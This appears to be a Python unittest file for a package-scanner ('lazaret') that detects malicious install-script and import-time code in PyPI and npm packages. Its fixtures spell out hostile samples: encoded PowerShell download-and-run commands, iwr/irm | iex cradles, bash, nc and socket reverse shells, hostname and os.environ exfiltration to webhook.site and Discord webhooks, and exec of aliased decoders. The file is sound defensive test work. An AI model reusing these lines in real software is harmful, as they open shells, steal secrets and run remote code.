"""Audit P0s (0.1.7): the install-script blind spots of the PyPI malware
benchmark, and import-time code that is SUSPICIOUS on its own.

Install scripts (install_script_risk) now also fail on PowerShell that hides
or fetches what it runs (an -EncodedCommand, decoded and read; a download
cradle; a download started), a script carried in a string literal that
downloads and runs code, a reverse shell, and the machine's user or host name
sent over the network. Import-time code (import_time_risk) gets the same
signs, and import_time_severity makes SC-IMPORT-RISK CRITICAL for the shapes
no library needs; a download-and-run is CRITICAL in a setup.py and when the
file is run with Python. The dependency decode flow reads a decoder imported
under another name and `.decrypt(` calls. The npm engine's twins are held to
these by js/test/supply-chain-signals.test.js and, on a random corpus, by
tests/architecture/test_js_parity_hooks.py.

Everything is inert text: hosts are .invalid, nothing is decoded into a file
or executed.
"""
import base64
import time
import unittest

from tests import _support  # noqa: F401
from lazaret.scanner import core

PS_RUN = base64.b64encode('Invoke-WebRequest -Uri "https://x.invalid/a.exe" -OutFile "a.exe"; '
                          'Invoke-Expression "a.exe"'.encode("utf-16-le")).decode()
PS_ECHO = base64.b64encode("echo hi".encode("utf-16-le")).decode()


class PowerShellTests(unittest.TestCase):
    def test_encoded_commands(self):
        for text in (f"subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand {PS_RUN}', shell=False)",
                     f"subprocess.run(['powershell.exe', '-enc', '{PS_RUN}'])", f"execSync('pwsh -e {PS_RUN}')",
                     f"os.system('PowerShell /EC {PS_RUN}')"):
            with self.subTest(text[:40]):
                self.assertEqual(core.powershell_risk(text),
                                 ["runs an encoded PowerShell command that downloads and runs code"])
        self.assertEqual(core.powershell_risk(f"os.system('powershell -enc {PS_ECHO}')"),
                         ["runs an encoded PowerShell command"])

    def test_plain_powershell(self):
        cradle = "execSync('powershell -c \"irm https://x.invalid/i.ps1 | iex\"')"
        self.assertEqual(core.powershell_risk(cradle), ["runs PowerShell that downloads and runs code"])
        webclient = "os.system(\"powershell IEX (New-Object Net.WebClient).DownloadString('https://x.invalid/a')\")"
        self.assertEqual(core.powershell_risk(webclient), ["runs PowerShell that downloads and runs code"])
        two_step = ("dl = \"powershell -Command \\\"Invoke-WebRequest -Uri 'https://x.invalid/a.exe' -OutFile 'a.exe'\\\"\"\n"
                    "run = \"powershell -Command \\\"Start-Process 'a.exe'\\\"\"\n")
        self.assertEqual(core.powershell_risk(two_step), ["runs PowerShell that downloads and runs code"])

    def test_not_powershell_that_hides_or_fetches(self):
        for text in ("subprocess.run(['powershell', '-Command', 'Get-ChildItem Env:'])",
                     "powershell -ExecutionPolicy Bypass -File build.ps1", "powershell -enc QUJD",
                     "iwr https://x.invalid/a | iex",            # no PowerShell named: not a command line
                     "# see the -EncodedCommand option of powershell in the docs"):
            with self.subTest(text):
                self.assertEqual(core.powershell_risk(text), [])


class StagerTests(unittest.TestCase):
    def test_a_script_in_a_string_that_downloads_and_runs(self):
        text = ('_t.write(b"""from urllib.request import urlopen as _u;exec(_u(\'https://x.invalid/p\').read())""")\n'
                '_system(f"start {exe} {_t.name}")\n')
        self.assertEqual(core.stager_at(text), text.index('"""'))
        self.assertIn("carries a script that downloads and runs code", core.install_script_risk(text))

    def test_not_a_stager(self):
        for text in ("print('usage: fetch https://x.invalid and run the installer with exec')\n",
                     "DOC = 'Call exec() on trusted code only; see https://docs.invalid'\n",
                     "s = '" + "exec(" * 50 + "http'\n"):
            with self.subTest(text[:30]):
                self.assertEqual(core.stager_at(text), -1)


class ReverseShellTests(unittest.TestCase):
    def test_reverse_shells(self):
        for text in ("s = socket.socket()\ns.connect((h, 4444))\nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\n"
                     "subprocess.call(['/bin/sh', '-i'])\n",
                     "os.system('bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')\n",
                     "os.system('nc -e /bin/sh 10.0.0.1 4242')\n",
                     "import socket, pty\ns = socket.socket()\ns.connect((h, p))\npty.spawn('/bin/bash')\n",
                     "const net = require('net'), sh = require('child_process').spawn('/bin/sh', []);\n"
                     "const c = new net.Socket();\nc.connect(4444, h, () => { c.pipe(sh.stdin); sh.stdout.pipe(c); });\n"):
            with self.subTest(text[:30]):
                self.assertGreaterEqual(core.reverse_shell_at(text), 0)
                self.assertIn("opens a reverse shell", core.install_script_risk(text))

    def test_not_reverse_shells(self):
        for text in ("fd = os.open(log, os.O_WRONLY)\nos.dup2(fd, 1)\n",
                     "import pty\npty.spawn('/bin/bash')\n",
                     "const sh = spawn('/bin/sh', ['-c', cmd]);\nsh.stdout.pipe(process.stdout);\n"):
            with self.subTest(text[:30]):
                self.assertEqual(core.reverse_shell_at(text), -1)


class HostInfoTests(unittest.TestCase):
    def test_sent_over_the_network(self):
        for text in ("import socket, urllib.request\nurllib.request.urlopen('https://x.invalid/?h=' + socket.gethostname())\n",
                     "system(\"curl https://x.invalid/w?us=$(whoami) -d \\\"$(ifconfig)\\\"\")\n",
                     "const os = require('os');\nfetch('https://x.invalid/', {method: 'POST', body: os.hostname()});\n"):
            with self.subTest(text[:30]):
                self.assertTrue(core.sends_host_info(text))
                self.assertIn("sends the machine's user or host name over the network", core.install_script_risk(text))

    def test_kept_local(self):
        self.assertFalse(core.sends_host_info("import socket\nprint(socket.gethostname())\n"))
        self.assertFalse(core.sends_host_info("print('run whoami to check')\nrequests.get(u)\n"))


class ImportTimeGradingTests(unittest.TestCase):
    def grade(self, text):
        reasons, line = core.import_time_risk(text)
        return reasons, line, core.import_time_severity(reasons)

    def test_strong_signs_are_critical(self):
        beacon = ("import socket, requests\n\ndef send():\n"
                  "    requests.post('https://webhook.site/0000', json={'h': socket.gethostname()})\n")
        reasons, line, sev = self.grade(beacon)
        self.assertEqual((reasons, line, sev), (
            ["sends the machine's user or host name to a data-capture service (webhook.site)"], 4, "CRITICAL"))
        harvest = "import os, json, requests\nrequests.post('https://discord.com/api/webhooks/1/x', data=json.dumps(dict(os.environ)))\n"
        self.assertEqual(self.grade(harvest)[2], "CRITICAL")
        self.assertIn("sends them to an exfiltration service (discord.com/api/webhooks)", self.grade(harvest)[0][0])
        for text in (f"subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand {PS_RUN}')\n",
                     "import urllib.request\nexec(urllib.request.urlopen('https://x.invalid/p').read())\n",
                     "s = socket.socket()\ns.connect((h, 4444))\nos.dup2(s.fileno(), 0)\nsubprocess.call(['/bin/sh', '-i'])\n",
                     "import requests, subprocess\nd = requests.get('https://x.invalid/p').content\n"
                     "open('p.py', 'wb').write(d)\nsubprocess.run(['python3', 'p.py'])\n"):
            with self.subTest(text[:30]):
                self.assertEqual(self.grade(text)[2], "CRITICAL")

    def test_what_sdks_share_stays_major_or_quiet(self):
        telemetry = "import socket, requests\nrequests.post('https://telemetry.invalid/v1', json={'host': socket.gethostname()})\n"
        self.assertEqual(self.grade(telemetry)[0], [])                      # host name to its own service
        notifier = "import socket, requests\nrequests.post('https://api.telegram.org/bot/sendMessage', data={'text': socket.gethostname()})\n"
        self.assertEqual(self.grade(notifier)[0], [])                       # a notification library
        harvest = "import os, json, requests\nrequests.post('https://api.invalid/c', data=json.dumps(dict(os.environ)))\n"
        self.assertEqual(self.grade(harvest)[2], "MAJOR")
        binary = ("const https = require('https');\nhttps.get(u, (r) => r.pipe(fs.createWriteStream(dst)));\n"
                  "execFileSync(dst, ['--version']);\n")
        reasons, _line, sev = self.grade(binary)
        self.assertEqual(sev, "MAJOR", reasons)


class ImportTimeProseTests(unittest.TestCase):
    """Comments and docstrings are not import-time code, and PowerShell counts
    there only as an argument of an exec call (the huggingface-hub and
    paramiko false positives of the audit's benign corpus)."""

    def test_a_cli_that_builds_its_self_update_command(self):
        text = ("import subprocess\n\ndef run_update():\n    return subprocess.call(_cmd())\n\n\ndef _cmd():\n"
                "    # `iwr ... | iex` cannot take parameters: create a scriptblock\n"
                "    return [\"powershell\", \"-NoProfile\", \"-Command\", \"& ([scriptblock]::Create((iwr -useb "
                "https://x.invalid/i.ps1)))\"]\n")
        self.assertEqual(core.import_time_risk(text, "py"), ([], None))
        self.assertEqual(core.import_time_risk(text), ([], None))       # the argv is returned, not run here

    def test_a_docstring_that_shows_the_installer(self):
        text = ('import subprocess\n\ndef installed():\n    """True when installed with\n'
                '        powershell -ExecutionPolicy ByPass -c "irm https://x.invalid/i.ps1 | iex"\n    """\n'
                '    return subprocess.run(["powershell", "-Command", "Get-ChildItem Env:"])\n')
        self.assertEqual(core.import_time_risk(text), (["runs PowerShell that downloads and runs code"], 7))
        self.assertEqual(core.import_time_risk(text, "py"), ([], None))

    def test_a_docstring_that_names_a_key_file(self):
        text = ('import socket\n\nclass Client:\n    def load(self):\n'
                '        """Loads ``id_rsa`` and ``id_rsa-cert.pub``."""\n        return socket.socket()\n')
        self.assertEqual(core.import_time_risk(text)[0],
                         ["reads credentials or the whole environment and sends data over the network"])
        self.assertEqual(core.import_time_risk(text, "py"), ([], None))
        js = "const https = require('https');\n// JSON.stringify(process.env) is never sent\nhttps.get(u);\n"
        self.assertEqual(core.import_time_risk(js, "js"), ([], None))

    def test_powershell_handed_to_an_exec_call(self):
        for text in ("import subprocess\nsubprocess.run(\n    [\n        \"powershell\",\n        \"-c\",\n"
                     "        \"irm https://x.invalid/i.ps1 | iex\",\n    ]\n)\n",
                     "execSync(`pwsh -c \"irm https://x.invalid/i.ps1 | iex\"`);\n"):
            with self.subTest(text[:30]):
                reasons, line = core.import_time_risk(text, "py")
                self.assertEqual(reasons, ["runs PowerShell that downloads and runs code"])
                self.assertEqual(line, 4 if text.startswith("import") else 1)     # where PowerShell is named

    def test_what_stays_code(self):
        run_doc = '"""\nimport urllib.request\nexec(urllib.request.urlopen("https://x.invalid/p").read())\n"""\nexec(__doc__)\n'
        self.assertEqual(core.import_time_risk(run_doc, "py")[0], ["runs code it receives over the network"])
        beacon = 'requests.post("https://webhook.site/0", data=socket.gethostname())'
        for text in (f"x = (\n    \"\"\"{beacon}\"\"\"\n)\n",            # an argument
                     f"x = \\\n\"\"\"{beacon}\"\"\"\n",                    # a continued line
                     f"x = f(\n    'a'\n    \"\"\"{beacon}\"\"\"\n)\n",   # joined to the string before it
                     f"f\"\"\"{beacon}\"\"\"\n",                           # an f-string runs its fields
                     f"\"\"\"{beacon}\"\"\".strip()\n"):                    # something follows it
            with self.subTest(text[:12]):
                self.assertTrue(core.import_time_risk(text, "py")[0])
        self.assertEqual(core.import_time_risk(f"x = 1\n\"\"\"\n{beacon}\n\"\"\"\n", "py"), ([], None))

    def test_lines_are_the_files(self):
        text = "# a comment\n'''doc\n\n'''\nimport requests, socket\nrequests.post('https://webhook.site/0', data=socket.gethostname())\n"
        self.assertEqual(core.import_time_risk(text, "py")[1], core.import_time_risk(text)[1])
        self.assertEqual(core.import_time_risk(text, "py")[1], 6)


class DecoderAliasTests(unittest.TestCase):
    def found(self, text):
        return [(i["rule"], i["line"]) for i in core.scan_file("site-packages/x/a.py", text, "py", dep=True)
                if i["rule"] == "SC-EVAL-DECODE"]

    def test_an_aliased_decoder(self):
        self.assertEqual(self.found("from base64 import b64encode, b64decode as invoke\nexec(invoke('aW1wb3J0IG9z'))\n"),
                         [("SC-EVAL-DECODE", 2)])
        self.assertEqual(self.found("from zlib import decompress as z\nblob = z(data)\nexec(blob)\n"),
                         [("SC-EVAL-DECODE", 3)])

    def test_a_decrypted_payload(self):
        self.assertEqual(self.found("from cryptography.fernet import Fernet\nexec(Fernet(b'k').decrypt(b'gAAAA'))\n"),
                         [("SC-EVAL-DECODE", 2)])

    def test_not_a_decoder(self):
        self.assertEqual(self.found("from base64 import b64encode as enc\nexec(enc(b'x'))\n"), [])
        self.assertEqual(self.found("from base64 import b64decode as invoke\nprint(invoke('aGk='))\n"), [])


class BoundsTests(unittest.TestCase):
    def test_linear_time(self):
        for text in ("powershell " * 50_000, "powershell -e " + "A" * 400_000, "'" * 200_000 + "exec http",
                     "dup2(" * 100_000, "$(whoami)" * 50_000, "iwr " * 100_000 + "| iex",
                     "from base64 import " + "b64decode as a, " * 20_000):
            t0 = time.monotonic()
            core.install_script_risk(text)
            core.import_time_risk(text)
            core._decoder_aliases(text)
            self.assertLess(time.monotonic() - t0, 10, text[:20])
        beacon = "import requests, socket\nrequests.post('https://webhook.site/0', data=socket.gethostname())\n"
        for tail in (" " * 200_000 + "'a' " * 50_000, "x = 1; " + "'a'; " * 60_000, "#\n" * 100_000,
                     '"""\n' * 50_000, "(" * 100_000 + "'a'\n" * 20_000, "\\\n'a'\n" * 40_000,
                     "powershell " * 50_000 + "os.system(" * 1000):
            for lang in ("py", "js"):
                t0 = time.monotonic()
                self.assertTrue(core.import_time_risk(beacon + tail, lang)[0])
                self.assertLess(time.monotonic() - t0, 10, (tail[:20], lang))


if __name__ == "__main__":
    unittest.main()
